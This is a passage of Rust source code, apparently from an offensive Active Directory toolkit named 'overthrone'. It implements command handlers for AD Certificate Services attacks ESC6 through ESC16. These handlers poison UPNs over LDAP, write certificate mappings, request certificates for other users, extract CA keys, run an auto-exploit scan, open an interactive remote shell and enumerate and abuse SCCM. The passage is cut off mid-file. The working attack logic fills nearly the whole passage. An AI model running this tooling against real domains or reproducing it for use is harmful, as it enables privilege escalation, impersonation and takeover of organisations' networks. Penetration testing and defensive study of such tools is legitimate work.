                    }
                    println!(" {} Certificate obtained via ESC6!", "[+]".green());
                    println!(" Saved to: {}", pfx_path.cyan());
                    println!(" Thumbprint: {}", cert.thumbprint.yellow());
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "output": pfx_path,
                            "thumbprint": cert.thumbprint,
                            }),
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC6 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc7 { ca } => {
            println!(
                " {} Checking for ESC7 vulnerabilities...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let target = overthrone_core::adcs::Esc7Target::new(
                ca,
                ca, // Using CA name as CA server for now
                &creds.domain,
                &creds.username,
            );

            match target.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    if let Ok(restore) = target.generate_restore_commands() {
                        println!("\n{}", restore.dimmed());
                    }
                    println!(
                        " {} CA permissions modified successfully (command generated)",
                        "[+]".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC7 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc8 { url, target_user } => {
            println!(" {} Executing ESC8 attack...", ">".bright_black());
            println!(" URL: {}", url.cyan());
            println!(" Target User: {}", target_user.cyan());

            // Parse URL to extract hostname and scheme
            let url_trimmed = url.trim_end_matches('/');
            let (use_https, hostname) = if let Some(rest) = url_trimmed.strip_prefix("https://") {
                (true, rest.split('/').next().unwrap_or(rest).to_string())
            } else if let Some(rest) = url_trimmed.strip_prefix("http://") {
                (false, rest.split('/').next().unwrap_or(rest).to_string())
            } else {
                // No scheme prefix -- assume HTTP (ESC8 standard)
                (
                    false,
                    url_trimmed
                        .split('/')
                        .next()
                        .unwrap_or(url_trimmed)
                        .to_string(),
                )
            };

            let target = overthrone_core::adcs::Esc8RelayTarget {
                ca_server: hostname,
                template: "Machine".to_string(),
                target_upn: Some(target_user.clone()),
                use_https,
            };

            let config = overthrone_core::adcs::Esc8AttackConfig::new(
                "0.0.0.0", // Default listener
                target,
                target_user.split('@').nth(1).unwrap_or("UNKNOWN.LOCAL"),
            );

            match config.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    println!(
                        " {} Certificate obtained via ESC8 relay (command generated)",
                        "[+]".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC8 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc9 {
            ca,
            template,
            target_upn,
            victim,
            original_upn,
            ldap_url,
            target_dc,
            ldap_user,
            ldap_pass,
            ldap_domain,
            victim_dn,
            ldaps,
            output,
        } => {
            println!(
                " {} Executing ESC9 attack (No Security Extension + UPN poisoning)...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Target UPN: {}", target_upn.cyan());
            println!(" Victim Account: {}", victim.cyan());

            // Determine whether we have a full live credential set for automatic LDAP UPN poisoning
            let live_ldap = match (
                target_dc.as_deref(),
                ldap_user.as_deref(),
                ldap_pass.as_deref(),
                ldap_domain.as_deref(),
                victim_dn.as_deref(),
            ) {
                (Some(dc_ip), Some(user), Some(pass), Some(domain), Some(dn)) => Some((
                    dc_ip.to_string(),
                    user.to_string(),
                    pass.to_string(),
                    domain.to_string(),
                    dn.to_string(),
                )),
                _ => None,
            };

            let config = overthrone_core::adcs::Esc9Config {
                ca_server: ca.to_string(),
                template: template.clone(),
                victim: victim.clone(),
                victim_dn: victim_dn.clone().unwrap_or_default(),
                original_upn: original_upn.clone(),
                target_upn: target_upn.clone(),
                ldap_url: ldap_url.clone(),
            };

            let exploiter = match overthrone_core::adcs::Esc9Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("Failed to create ESC9 exploiter: {}", e));
                    return 1;
                }
            };

            let result = if let Some((dc_ip, user, pass, domain, dn)) = live_ldap {
                // - LIVE MODE: connect LDAP and auto-poison/restore UPN -
                println!(
                    " {} Live LDAP mode: auto-poisoning UPN via {}",
                    ">".bright_black(),
                    dc_ip
                );
                let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
                    &dc_ip, &domain, &user, &pass, *ldaps,
                )
                .await;
                let mut ldap_session = match ldap_result {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("LDAP connect failed: {}", e));
                        return 1;
                    }
                };
                // Patch victim_dn into config for the live call
                let live_config = overthrone_core::adcs::Esc9Config {
                    victim_dn: dn,
                    ..config.clone()
                };
                exploiter
                    .exploit_with_ldap(&live_config, &mut ldap_session)
                    .await
            } else {
                // - GUIDANCE MODE: print operator commands, do CSR only -
                let (set_cmd, restore_cmd) =
                    overthrone_core::adcs::Esc9Exploiter::generate_ldap_commands(&config);
                println!("\n {} LDAP Setup Commands:", ">".bright_black());
                println!("{}", set_cmd.yellow());
                println!(
                    "\n {} After obtaining certificate, restore the UPN:",
                    ">".bright_black()
                );
                println!("{}", restore_cmd.dimmed());
                println!(
                    " {} Tip: supply --target-dc/--ldap-user/--ldap-pass/--ldap-domain/--victim-dn for fully automated mode",
                    "i".dimmed()
                );
                exploiter.exploit(&config).await.map(|mut r| {
                    r.upn_restored = false;
                    r
                })
            };

            match result {
                Ok(result) => {
                    println!("\n {} Certificate obtained!", "[+]".green());
                    println!(" Thumbprint: {}", result.certificate.thumbprint.cyan());
                    println!(" Saved to: {}", output.cyan());
                    if result.upn_restored {
                        println!(" UPN: {} restored", "[+]".green());
                    } else {
                        println!(
                            " UPN: {} restore pending (see LDAP commands above)",
                            "!".yellow()
                        );
                    }
                    println!(" PKINIT: {}", result.pkinit_hint.yellow());
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC9 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc10 {
            ca,
            template,
            target_upn,
            variant,
            victim,
            victim_dn,
            original_upn,
            target_dc,
            ldap_user,
            ldap_pass,
            ldap_domain,
            ldaps,
            output,
        } => {
            println!(
                " {} Executing ESC10 attack (Weak Certificate Mapping)...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Target UPN: {}", target_upn.cyan());

            let esc_variant = if variant.to_lowercase() == "b" {
                overthrone_core::adcs::Esc10Variant::UPNMappingEnabled
            } else {
                overthrone_core::adcs::Esc10Variant::WeakBindingEnforcement
            };
            println!(" Variant: {}", esc_variant.to_string().cyan());

            // Determine whether we have enough for a Variant B live run
            let live_ldap_b = match (
                &esc_variant,
                target_dc.as_deref(),
                ldap_user.as_deref(),
                ldap_pass.as_deref(),
                ldap_domain.as_deref(),
                victim_dn.as_deref(),
                original_upn.as_deref(),
            ) {
                (
                    overthrone_core::adcs::Esc10Variant::UPNMappingEnabled,
                    Some(dc_ip),
                    Some(user),
                    Some(pass),
                    Some(domain),
                    Some(dn),
                    Some(orig),
                ) => Some((
                    dc_ip.to_string(),
                    user.to_string(),
                    pass.to_string(),
                    domain.to_string(),
                    dn.to_string(),
                    orig.to_string(),
                )),
                _ => None,
            };

            let config = overthrone_core::adcs::Esc10Config {
                variant: esc_variant.clone(),
                template: template.clone(),
                target_upn: target_upn.clone(),
                victim_account: victim.clone(),
                victim_dn: victim_dn.clone(),
                original_upn: original_upn.clone(),
            };

            let exploiter = match overthrone_core::adcs::Esc10Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("Failed to create ESC10 exploiter: {}", e));
                    return 1;
                }
            };

            let result = if let Some((dc_ip, user, pass, domain, dn, orig)) = live_ldap_b {
                // - LIVE MODE (Variant B): connect LDAP and auto-poison/restore UPN -
                println!(
                    " {} Live LDAP mode (Variant B): auto-poisoning UPN via {}",
                    ">".bright_black(),
                    dc_ip
                );
                let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
                    &dc_ip, &domain, &user, &pass, *ldaps,
                )
                .await;
                let mut ldap_session = match ldap_result {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("LDAP connect failed: {}", e));
                        return 1;
                    }
                };
                let live_config = overthrone_core::adcs::Esc10Config {
                    victim_dn: Some(dn),
                    original_upn: Some(orig),
                    ..config.clone()
                };
                exploiter
                    .exploit_with_ldap(&live_config, &mut ldap_session)
                    .await
            } else {
                // - STANDARD MODE: Variant A always works; Variant B without creds prints a hint -
                if esc_variant == overthrone_core::adcs::Esc10Variant::UPNMappingEnabled {
                    println!(
                        " {} Tip: supply --target-dc/--ldap-user/--ldap-pass/--ldap-domain/--victim-dn/--original-upn for fully automated Variant B",
                        "i".dimmed()
                    );
                }
                exploiter.exploit(&config).await
            };

            match result {
                Ok(result) => {
                    println!("\n {} Certificate obtained!", "[+]".green());
                    println!(" Thumbprint: {}", result.certificate.thumbprint.cyan());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Auth: {}", result.auth_hints.certipy_command.yellow());
                    println!(" Remediation: {}", result.auth_hints.remediation.dimmed());
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC10 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc11 {
            ca_host,
            ca_name,
            template,
            smb_user,
            smb_pass,
            smb_domain,
        } => {
            println!(
                " {} Assessing ESC11 (NTLM Relay to ICPR)...",
                ">".bright_black()
            );
            println!(" CA Host: {}", ca_host.cyan());
            println!(" CA Name: {}", ca_name.cyan());
            println!(" Template: {}", template.cyan());

            let config = overthrone_core::adcs::Esc11Config {
                ca_host: ca_host.clone(),
                ca_name: ca_name.clone(),
                template: template.clone(),
                relayed_identity: String::new(),
            };

            let exploiter = overthrone_core::adcs::Esc11Exploiter::new(config);

            // Determine whether we have SMB credentials for a live registry read
            let live_smb = match (
                smb_user.as_deref(),
                smb_pass.as_deref(),
                smb_domain.as_deref(),
            ) {
                (Some(user), Some(pass), Some(domain)) => {
                    Some((user.to_string(), pass.to_string(), domain.to_string()))
                }
                _ => None,
            };

            let assessment = if let Some((user, pass, domain)) = live_smb {
                // - LIVE MODE: read InterfaceFlags via WINREG RPC -
                println!(
                    " {} Live mode: connecting SMB to {} for registry read...",
                    ">".bright_black(),
                    ca_host
                );
                let smb_result = overthrone_core::proto::smb::SmbSession::connect(
                    ca_host, &domain, &user, &pass,
                )
                .await;
                match smb_result {
                    Ok(mut smb) => match exploiter.assess_with_smb(&mut smb).await {
                        Ok(a) => a,
                        Err(e) => {
                            banner::print_fail(&format!("ESC11 live assessment failed: {}", e));
                            return 1;
                        }
                    },
                    Err(e) => {
                        banner::print_fail(&format!("SMB connect to {} failed: {}", ca_host, e));
                        return 1;
                    }
                }
            } else {
                // - GUIDANCE MODE: assessment without live registry read -
                println!(
                    " {} Tip: supply --smb-user/--smb-pass/--smb-domain for live InterfaceFlags registry read",
                    "i".dimmed()
                );
                match exploiter.assess().await {
                    Ok(a) => a,
                    Err(e) => {
                        banner::print_fail(&format!("ESC11 assessment failed: {}", e));
                        return 1;
                    }
                }
            };

            if assessment.is_vulnerable {
                println!(
                    " {} CA is VULNERABLE to ESC11 (IF_ENFORCEENCRYPTICERTREQUEST disabled)",
                    "[!]...".red().bold()
                );
                if let Some(flags) = assessment.interface_flags {
                    println!(" InterfaceFlags: 0x{:08X}", flags);
                }
            } else if assessment.interface_flags.is_some() {
                println!(
                    " {} CA appears NOT vulnerable (IF_ENFORCEENCRYPTICERTREQUEST is set)",
                    "[+]".green()
                );
            }
            println!("\n {} Registry path checked:", ">".bright_black());
            println!(" {}", assessment.registry_path.cyan());
            println!("\n {} Relay command:", ">".bright_black());
            println!("{}", assessment.relay_command.yellow());
            println!("\n {} Remediation:", ">".bright_black());
            println!("{}", assessment.remediation.dimmed());
        }
        AdcsAction::Esc12 {
            ca_host,
            ca_name,
            operator,
            backup_path,
        } => {
            println!(
                " {} Generating ESC12 CA key extraction guidance...",
                ">".bright_black()
            );
            println!(" CA Host: {}", ca_host.cyan());
            println!(" CA Name: {}", ca_name.cyan());
            println!(" Operator: {}", operator.cyan());

            let config = overthrone_core::adcs::Esc12Config {
                ca_host: ca_host.clone(),
                ca_name: ca_name.clone(),
                operator_account: operator.clone(),
                backup_path: backup_path.clone(),
            };

            let exploiter = overthrone_core::adcs::Esc12Exploiter::new(config);
            let assessment = exploiter.assess();

            println!("\n {} Certutil backup command:", ">".bright_black());
            println!("{}", assessment.certutil_backup_command.yellow());
            println!("\n {} Certipy command:", ">".bright_black());
            println!("{}", assessment.certipy_command.yellow());
            println!("\n {} Offline forgery:", ">".bright_black());
            println!("{}", assessment.offline_forgery_command.yellow());
            println!("\n {} CA key paths to check:", ">".bright_black());
            for path in &assessment.ca_key_paths {
                println!(" {}", path.cyan());
            }
            println!("\n {} Remediation:", ">".bright_black());
            println!("{}", assessment.remediation.dimmed());
        }
        AdcsAction::Esc13 {
            ca,
            template,
            policy_oid,
            linked_group_dn,
            subject,
            output,
        } => {
            println!(
                " {} Executing ESC13 attack (Issuance Policy OID-to-Group Link)...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Policy OID: {}", policy_oid.cyan());
            println!(" Linked Group: {}", linked_group_dn.cyan());

            let config = overthrone_core::adcs::Esc13Config {
                ca_server: ca.clone(),
                template: template.clone(),
                subject_cn: subject.clone(),
                policy_oid: policy_oid.clone(),
                linked_group_dn: linked_group_dn.clone(),
            };

            let exploiter = match overthrone_core::adcs::Esc13Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("Failed to create ESC13 exploiter: {}", e));
                    return 1;
                }
            };

            match exploiter.exploit(&config).await {
                Ok(result) => {
                    println!("\n {} Certificate obtained!", "[+]".green());
                    println!(" Thumbprint: {}", result.certificate.thumbprint.cyan());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Granted Group: {}", result.granted_group_dn.yellow());
                    println!(" Impact: {}", result.impact_description.yellow());
                    println!(" PKINIT: {}", result.pkinit_command.cyan());
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC13 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc14 {
            target_dn,
            target_sam,
            mapping,
            dc,
            live,
        } => {
            println!(
                " {} Assessing ESC14 attack (altSecurityIdentities Mapping)...",
                ">".bright_black()
            );
            println!(" Target DN: {}", target_dn.cyan());
            println!(" Target SAM: {}", target_sam.cyan());
            println!(" Mapping: {}", mapping.cyan());

            let mut config = overthrone_core::adcs::Esc14Config {
                target_dn: target_dn.clone(),
                target_sam: target_sam.clone(),
                mapping_value: mapping.clone(),
                mapping_style: overthrone_core::adcs::MappingStyle::Rfc822,
                dc_host: dc.clone().unwrap_or_else(|| "DC.DOMAIN.LOCAL".to_string()),
                domain: "DOMAIN.LOCAL".to_string(),
                use_ldaps: false,
            };

            let exploiter = overthrone_core::adcs::Esc14Exploiter::new();

            if *live {
                let creds = match crate::require_creds(cli) {
                    Ok(c) => c,
                    Err(e) => return e,
                };
                let dc_host = match dc {
                    Some(d) => d.clone(),
                    None => match crate::require_dc(cli) {
                        Ok(d) => d,
                        Err(e) => return e,
                    },
                };

                config.dc_host = dc_host;
                config.domain = creds.domain.clone();

                let password = creds.password().unwrap_or("");
                match exploiter
                    .exploit_with_ldap(&config, &creds.username, password)
                    .await
                {
                    Ok(result) => {
                        println!(
                            "\n {} Mapping written successfully via LDAP!",
                            "[+]".green()
                        );
                        println!(" PKINIT: {}", result.pkinit_command.cyan());
                        println!(" Impact: {}", result.impact_description.yellow());
                        println!("\n {} CLEANUP COMMAND:", "i".dimmed());
                        println!("{}", result.cleanup_command.dimmed());
                    }
                    Err(e) => {
                        banner::print_fail(&format!("ESC14 live attack failed: {}", e));
                        return 1;
                    }
                }
            } else {
                match exploiter.assess(&config) {
                    Ok(result) => {
                        println!("\n {} ESC14 Guidance Generated:", ">".bright_black());
                        for step in result.guidance {
                            println!(" {}", step);
                        }
                        println!("\n {} PKINIT Command Template:", ">".bright_black());
                        println!(" {}", result.pkinit_command.cyan());
                        println!("\n {} CLEANUP COMMAND:", "i".dimmed());
                        println!("{}", result.cleanup_command.dimmed());
                    }
                    Err(e) => {
                        banner::print_fail(&format!("ESC14 assessment failed: {}", e));
                        return 1;
                    }
                }
            }
        }
        AdcsAction::Esc15 {
            ca,
            template,
            target_user,
            output,
        } => {
            println!(
                " {} Executing ESC15 attack (Schema V1 EKUwu abuse)...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Target: {}", target_user.cyan());

            let exploiter = match overthrone_core::adcs::Esc15Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("Failed to create ESC15 exploiter: {}", e));
                    return 1;
                }
            };

            let creds = crate::require_creds_silent(cli).unwrap_or_default();
            let config = overthrone_core::adcs::Esc15Config {
                ca_server: ca.clone(),
                template: template.clone(),
                target_user: target_user.clone(),
                domain: creds.domain,
            };

            match exploiter.exploit(&config).await {
                Ok(result) => {
                    if let Err(e) = tokio::fs::write(output, &result.certificate.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
                    }
                    println!("\n {} Certificate obtained via ESC15!", "[+]".green());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Thumbprint: {}", result.certificate.thumbprint.cyan());
                    println!(" PKINIT: {}", result.pkinit_command.cyan());
                    println!(" Impact: {}", result.impact_description.yellow());
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC15 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc16 {
            ca,
            template,
            target_upn,
            victim,
            original_upn,
            ldap_url,
            output,
        } => {
            println!(
                " {} Executing ESC16 attack (NO_SECURITY_EXTENSION abuse)...",
                ">".bright_black()
            );
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Target UPN: {}", target_upn.cyan());
            println!(" Victim: {}", victim.cyan());

            let exploiter = match overthrone_core::adcs::Esc16Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("Failed to create ESC16 exploiter: {}", e));
                    return 1;
                }
            };

            let creds = crate::require_creds_silent(cli).unwrap_or_default();
            let config = overthrone_core::adcs::Esc16Config {
                ca_server: ca.clone(),
                template: template.clone(),
                target_upn: target_upn.clone(),
                victim: victim.clone(),
                original_upn: original_upn.clone(),
                domain: creds.domain,
                ldap_url: ldap_url.clone(),
            };

            match exploiter.exploit(&config).await {
                Ok(result) => {
                    if let Err(e) = tokio::fs::write(output, &result.certificate.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
                    }
                    println!("\n {} Certificate obtained via ESC16!", "[+]".green());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Thumbprint: {}", result.certificate.thumbprint.cyan());
                    println!(" PKINIT: {}", result.pkinit_command.cyan());
                    println!(" Impact: {}", result.impact_description.yellow());
                    println!("\n {} CLEANUP COMMANDS:", "i".dimmed());
                    for cmd in result.cleanup_commands {
                        println!("{}", cmd.dimmed());
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC16 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Request {
            ca,
            template,
            subject,
            san,
            output,
        } => {
            println!(" {} Requesting certificate...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            if let Some(subj) = subject {
                println!(" Subject: {}", subj.cyan());
            }
            if let Some(san_val) = san {
                println!(" SAN: {}", san_val.cyan());
            }

            let client = match overthrone_core::adcs::AdcsClient::new(ca) {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("ADCS client init failed: {}", e));
                    return 1;
                }
            };

            let subj_cn = subject.as_deref().unwrap_or("overthrone-request");
            match client
                .request_certificate(subj_cn, template, san.as_deref())
                .await
            {
                Ok(cert) => {
                    if let Err(e) = tokio::fs::write(output, &cert.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
                    }
                    println!(" {} Certificate obtained!", "[+]".green());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Thumbprint: {}", cert.thumbprint.yellow());
                    println!(" Serial: {}", cert.serial_number.dimmed());
                }
                Err(e) => {
                    banner::print_fail(&format!("Certificate request failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Auto {
            ca,
            template,
            target_user,
            exploit,
        } => {
            use overthrone_core::adcs::auto_exploit::{AdcsAutoConfig, AdcsAutoScanner};

            let dc_host = cli
                .dc_host
                .as_deref()
                .unwrap_or(ca.as_deref().unwrap_or_default());
            let domain = cli.domain.as_deref().unwrap_or("");
            let username = cli.username.as_deref().unwrap_or("");
            let password = cli.password.as_deref().unwrap_or("");

            if domain.is_empty() || username.is_empty() || password.is_empty() {
                banner::print_fail(
                    "Domain, username, and password are required for ADCS auto-scan",
                );
                return 1;
            }

            let config = AdcsAutoConfig {
                domain: domain.to_string(),
                dc_host: dc_host.to_string(),
                username: username.to_string(),
                password: password.to_string(),
                ca_server: ca.clone(),
                target_template: template.clone(),
                target_upn: target_user.clone(),
                use_ldaps: false,
            };

            let scanner = AdcsAutoScanner::new(config);
            banner::print_info("Scanning for ADCS ESC vulnerabilities...");

            let mut report = match scanner.scan().await {
                Ok(r) => r,
                Err(e) => {
                    banner::print_fail(&format!("ADCS ESC scan for {domain} failed: {e}"));
                    return 1;
                }
            };

            println!();
            println!(
                " {} ADCS ESC Scan Results for {}",
                ">".bright_black(),
                domain.cyan()
            );
            if let Some(ref ca) = report.ca_server {
                println!(" {} CA Server: {}", ">".bright_black(), ca.cyan());
            }
            println!(
                " {} Templates found: {}",
                ">".bright_black(),
                report.templates.len().to_string().yellow()
            );
            println!(
                " {} Vulnerabilities found: {}",
                ">".bright_black(),
                report.vulnerabilities.len().to_string().yellow()
            );
            println!();

            if report.vulnerabilities.is_empty() {
                banner::print_warn("No ESC vulnerabilities detected");
                return 0;
            }

            for vuln in &report.vulnerabilities {
                let sev_color = match vuln.severity.as_str() {
                    "Critical" => "CRITICAL".red(),
                    "High" => "HIGH".yellow(),
                    _ => vuln.severity.dimmed(),
                };
                println!(
                    " {} {} -- {}",
                    sev_color,
                    format!("ESC{}", vuln.esc_number).bright_white(),
                    vuln.description().dimmed()
                );
                println!(" {}", format!("Target: {}", vuln.target).dimmed());
            }

            if *exploit {
                println!();
                banner::print_info("Attempting auto-exploitation of most severe findings...");
                match scanner.auto_exploit(&mut report).await {
                    Ok(()) => {
                        let exploited: Vec<_> = report
                            .vulnerabilities
                            .iter()
                            .filter(|v| v.auto_exploited)
                            .collect();
                        if exploited.is_empty() {
                            banner::print_warn("Auto-exploitation did not yield any certificates");
                            for vuln in &report.vulnerabilities {
                                if let Some(ref err) = vuln.exploit_error {
                                    println!(
                                        " {} ESC{}: {}",
                                        "[-]".red(),
                                        vuln.esc_number,
                                        err.dimmed()
                                    );
                                }
                            }
                        } else {
                            for v in &exploited {
                                let path = format!("esc{}_{}.pfx", v.esc_number, v.target);
                                if let Some(ref pfx) = v.pfx_data {
                                    if let Err(e) = tokio::fs::write(&path, pfx).await {
                                        banner::print_fail(&format!("Failed to write PFX: {e}"));
                                    } else {
                                        println!(
                                            " {} ESC{} exploited -- saved to {}",
                                            "[+]".green(),
                                            v.esc_number,
                                            path.cyan()
                                        );
                                    }
                                }
                            }
                        }
                    }
                    Err(e) => {
                        banner::print_fail(&format!("ADCS auto-exploit for {domain} failed: {e}"));
                        return 1;
                    }
                }
            }
        }
        AdcsAction::GetCaCert { output } => {
            println!(
                " {} Retrieving CA certificate via LDAP...",
                ">".bright_black()
            );

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match crate::require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            let password = creds.password().unwrap_or("");
            match overthrone_forge::ms_wcce_dcom::get_ca_certificate_via_ldap(
                &dc,
                &creds.domain,
                &creds.username,
                password,
            )
            .await
            {
                Ok(cert_der) => {
                    if let Err(e) = tokio::fs::write(output, &cert_der).await {
                        banner::print_fail(&format!("Failed to write CA certificate: {}", e));
                        return 1;
                    }
                    println!(
                        " {} CA certificate obtained ({} bytes)",
                        "[+]".green(),
                        cert_der.len()
                    );
                    println!(" Saved to: {}", output.cyan());
                }
                Err(e) => {
                    banner::print_fail(&format!("CA certificate retrieval failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::BackupCa { output } => {
            println!(
                " {} Retrieving CA certificate via LDAP (backup)...",
                ">".bright_black()
            );
            println!(
                " {} Note: backup-ca retrieves the CA certificate. The private key requires local CA access.",
                " [!]".yellow()
            );

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match crate::require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            let password = creds.password().unwrap_or("");
            match overthrone_forge::ms_wcce_dcom::get_ca_certificate_via_ldap(
                &dc,
                &creds.domain,
                &creds.username,
                password,
            )
            .await
            {
                Ok(cert_der) => {
                    if let Err(e) = tokio::fs::write(output, &cert_der).await {
                        banner::print_fail(&format!("Failed to write CA backup: {}", e));
                        return 1;
                    }
                    println!(
                        " {} CA certificate backed up ({} bytes)",
                        "[+]".green(),
                        cert_der.len()
                    );
                    println!(" Saved to: {}", output.cyan());
                }
                Err(e) => {
                    banner::print_fail(&format!("CA backup failed: {}", e));
                    return 1;
                }
            }
        }
    }

    banner::print_success("ADCS operation completed");
    0
}

// ----------------------------------------------
// cmd_shell -- Interactive Shell
// ----------------------------------------------

pub async fn cmd_shell(cli: &Cli, target: &str, shell_type: &ShellType) -> i32 {
    banner::print_module_banner("SHELL");
    println!(" {} Starting interactive shell session", ">".bright_black());
    println!(" {} Target: {}", ">".bright_black(), target.cyan());
    println!(" {} Type: {:?}", ">".bright_black(), shell_type);
    println!();

    // Resolve optional credentials from CLI flags
    let (domain, username, password) = match crate::require_creds_silent(cli) {
        Ok(creds) => (
            Some(creds.domain.clone()),
            Some(creds.username.clone()),
            creds.password().map(|s| s.to_string()),
        ),
        Err(_) => (None, None, None),
    };

    // Use the new interactive shell implementation with target and optional credentials
    match crate::interactive_shell::start_interactive_shell_with_creds(
        target, shell_type, domain, username, password,
    )
    .await
    {
        Ok(()) => {
            banner::print_success("Interactive shell session completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Interactive shell error: {}", e));
            1
        }
    }
}

// ----------------------------------------------
// cmd_sccm -- SCCM Abuse
// ----------------------------------------------

pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
    use overthrone_core::sccm;
    banner::print_module_banner("SCCM");

    match action {
        SccmAction::Enum { site_server } => {
            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let target = match site_server.as_deref() {
                Some(s) => s.to_string(),
                None => match crate::require_dc(cli) {
                    Ok(d) => d,
                    Err(e) => return e,
                },
            };

            println!(
                " {} Enumerating SCCM on {}...",
                ">".bright_black(),
                target.cyan()
            );

            let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
                target: target.clone(),
                domain: creds.domain.clone(),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                pth_hash: creds.nthash().map(str::to_string),
                site_code: None,
            }) {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SCCM scanner init: {}", e));
                    return 1;
                }
            };

            let sites = match scanner.discover_site().await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("Site discovery: {}", e));
                    return 1;
                }
            };

            if sites.is_empty() {
                println!(" {} No SCCM site found on {}", "!".yellow(), target.cyan());
                return 0;
            }

            for site in &sites {
                println!(
                    "\n {} Site {} @ {} ({})",
                    "[+]".green(),
                    site.site_code.cyan(),
                    site.site_server.cyan(),
                    site.version.dimmed()
                );

                match sccm::wmi::enumerate_collections(site).await {
                    Ok(cols) if !cols.is_empty() => {
                        println!(" {} Collections ({}):", ">".bright_black(), cols.len());
                        for c in &cols {
                            println!(
                                " - [{}] {} ({} members, {})",
                                c.collection_id.yellow(),
                                c.name.cyan(),
                                c.member_count,
                                c.collection_type
                            );
                        }
                    }
                    Ok(_) => println!(
                        " {} Collections: (WMI requires Windows -- see debug log for PowerShell)",
                        ">".bright_black()
                    ),
                    Err(e) => println!(" {} Collections: {}", "!".yellow(), e),
                }

                match sccm::wmi::enumerate_devices(site).await {
                    Ok(devs) if !devs.is_empty() => {
                        println!(" {} Devices ({}):", ">".bright_black(), devs.len());
                        for d in devs.iter().take(20) {
                            println!(" - {} [{}]", d.name.cyan(), d.os_name.dimmed());
                        }
                        if devs.len() > 20 {
                            println!(" ... {} more", devs.len() - 20);
                        }
                    }
                    Ok(_) => {}
                    Err(e) => println!(" {} Devices: {}", "!".yellow(), e),
                }

                match sccm::wmi::enumerate_applications(site).await {
                    Ok(apps) if !apps.is_empty() => {
                        println!(" {} Applications ({}):", ">".bright_black(), apps.len());
                        for a in apps.iter().take(20) {
                            println!(
                                " - {} [{}]{}",
                                a.name.cyan(),
                                a.app_id.dimmed(),
                                if a.is_deployed { " (deployed)" } else { "" }
                            );
                        }
                        if apps.len() > 20 {
                            println!(" ... {} more", apps.len() - 20);
                        }
                    }
                    Ok(_) => {}
                    Err(e) => println!(" {} Applications: {}", "!".yellow(), e),
                }
            }
        }

        SccmAction::Abuse {
            site_server,
            technique,
        } => {
            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            println!(
                " {} Abusing SCCM on {}...",
                ">".bright_black(),
                site_server.cyan()
            );

            match technique {
                SccmTechnique::ClientPush => {
